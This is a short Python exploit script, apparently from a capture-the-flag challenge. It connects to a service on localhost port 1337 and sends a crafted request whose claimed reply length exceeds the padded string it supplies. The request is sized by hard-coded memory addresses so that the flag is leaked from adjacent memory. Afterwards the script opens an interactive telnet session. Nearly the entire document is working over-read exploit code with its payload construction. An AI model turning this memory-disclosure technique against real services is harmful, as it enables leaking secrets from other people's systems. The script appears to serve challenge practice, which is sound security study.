import socket
import struct
import telnetlib

# Local
target_host = "localhost"
target_port = 1337

# Remote
#target_host = ""
#target_port = 1337

def p64(data):
	return struct.pack('<Q',data)

def p32(data):
	return struct.pack('<I',data)

def u64(data):
	return struct.unpack('<Q',data)[0]

def u32(data):
	return struct.unpack('<I',data)[0]

def sock():
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((target_host,target_port))
	return s

def interactive(s):
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def debug_print(prompt,value,formatting = 16):
	if formatting == 16:
		print("[+] " + prompt + "= {0:x}".format(value))
	else:
		print("[+] " + prompt + "= {0:d}".format(value))

def write_buf(data):
	fd = open('buf','wb')
	fd.write(data)
	fd.close()


def main():
	# main exploit here

	s = sock()

	# important value define
	flag_address = 0x6b7540
	globals_address = 0x6b7340
	offset = flag_address - globals_address
	flag_length = 0x20


	# payload create

	buf = "SERVER, ARE YOU STILL THERE? IF SO, REPLY \""
	buf += "X" * (offset)
	buf += "\""
	buf += "(%d)" % (offset + flag_length)
	buf += "\n"

	# send and recv

	s.send(buf)
	write_buf(buf)
	print(s.recv(1024))

	# interactive

	interactive(s)


if __name__ == '__main__':
	main()





